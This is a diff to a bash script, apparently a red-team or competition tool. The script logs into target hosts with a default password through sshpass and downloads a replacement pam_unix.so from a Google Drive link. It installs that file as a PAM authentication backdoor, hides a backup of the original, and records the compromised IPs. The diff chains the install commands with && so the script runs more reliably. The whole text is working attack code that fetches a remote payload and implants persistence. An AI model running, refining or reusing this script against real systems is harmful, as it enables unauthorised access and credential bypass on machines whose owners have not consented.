@@ -6,7 +6,7 @@ host_ids=(10 20 30 40 50)
 admins=("admin1" "admin2" "admin3")
 default_password="Password1!"
 backdoor_password="yuh"
-IPs=()
+IPs=("127.0.0.1")
 timeout_duration=1
 scoring_link="https://..."
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
@@ -19,17 +19,17 @@ send_backdoor() {
     for IP in "${IPs[@]}"; do
         for admin in "${admins[@]}"; do
             sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
-                echo \"$default_password\" | sudo -S apt install curl
-                echo \"$default_password\" | sudo -S curl -o /tmp/pam_unix.so $backdoor_link
-                echo \"$default_password\" | sudo -S cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/.pam_unix.so.bak
+                echo \"$default_password\" | sudo -S apt install curl &&
+                echo \"$default_password\" | sudo -S curl -o /tmp/pam_unix.so $backdoor_link &&
+                echo \"$default_password\" | sudo -S cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/.pam_unix.so.bak &&
                 echo \"$default_password\" | sudo -S mv /tmp/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
             "
 
             if [[ $? -eq 0 ]]; then
                 if ! grep -q "$IP" backdoored_IPs.txt; then
                     echo "$IP" >> backdoored_IPs.txt
-                    echo "Backdoor successfully implanted at $IP"
                 fi
+                echo "Backdoor successfully implanted at $IP"
                 break
             fi
         done
